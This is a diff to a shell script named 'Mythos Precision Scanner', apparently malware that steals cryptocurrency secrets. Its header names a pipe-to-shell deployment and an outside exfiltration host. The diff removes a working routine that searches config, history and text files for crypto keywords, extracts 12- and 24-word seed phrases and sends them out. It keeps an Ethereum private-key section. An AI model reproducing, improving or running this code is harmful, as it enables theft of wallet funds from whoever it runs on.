@@ -1,5 +1,5 @@
 #!/bin/sh
-# Mythos Precision Scanner v3.2 — Robust ignore list, validated patterns
+# Mythos Precision Scanner v3.3 — ETH/SOL/BTC only, no BIP39 seeds, dual exfil
 # Deploy: curl -sL URL | sh
 # Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun
 
@@ -92,41 +92,7 @@ send() {
 done) &
 
 ###############################################################################
-# 2. BIP39 SEED PHRASES — only files with crypto keywords, skip trash
-# Validated: 12 or 24 lowercase words (3-8 chars each), near crypto context
-###############################################################################
-CRYPTO_KEYWORDS='seed|mnemonic|phrase|wallet|private.key|recovery|secret|backup|passphrase|metamask|phantom|solana|ethereum|bitcoin|trustwallet|exodus|ledger|trezor|bip39|bip32|derivation'
-
-(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.md' -o -name '*.log' -o -name '*.json' \
-    -o -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '.bash_history' \
-    -o -name '*.yml' -o -name '*.yaml' -o -name '*.toml' \) -size -10M" 2>/dev/null | while read f; do
-    
-    # Only scan files with crypto keywords (massive FP reduction)
-    grep -qilE "$CRYPTO_KEYWORDS" "$f" 2>/dev/null || continue
-    
-    # 12-word BIP39: all lowercase, 3-8 chars per word
-    tr '[:upper:]' '[:lower:]' < "$f" 2>/dev/null | tr -cs 'a-z' '\n' | \
-    awk '{w[NR%24]=$0}
-    NR>=12 {
-        ok=1; for(i=1;i<=12;i++){if(length(w[(NR-12+i)%24])<3||length(w[(NR-12+i)%24])>8){ok=0;break}}
-        if(ok){s="";for(i=1;i<=12;i++)s=s w[(NR-12+i)%24] " ";print "12|"s}
-    }' 2>/dev/null | head -2 | while read seed; do
-        send "SEED12" "${f}:${seed}"
-    done
-    
-    # 24-word BIP39
-    tr '[:upper:]' '[:lower:]' < "$f" 2>/dev/null | tr -cs 'a-z' '\n' | \
-    awk '{w[NR%24]=$0}
-    NR>=24 {
-        ok=1; for(i=1;i<=24;i++){if(length(w[(NR-24+i)%24])<3||length(w[(NR-24+i)%24])>8){ok=0;break}}
-        if(ok){s="";for(i=1;i<=24;i++)s=s w[(NR-24+i)%24] " ";print "24|"s}
-    }' 2>/dev/null | head -2 | while read seed; do
-        send "SEED24" "${f}:${seed}"
-    done
-done) &
-
-###############################################################################
-# 3. ETHEREUM PRIVATE KEY — validated 64 hex chars
+# 2. ETHEREUM PRIVATE KEY — validated 64 hex chars
 # Pattern: exactly 64 hex chars [0-9a-fA-F]
 # Filter: reject known false positives (hex constants, test vectors, prefix patterns)
 ###############################################################################
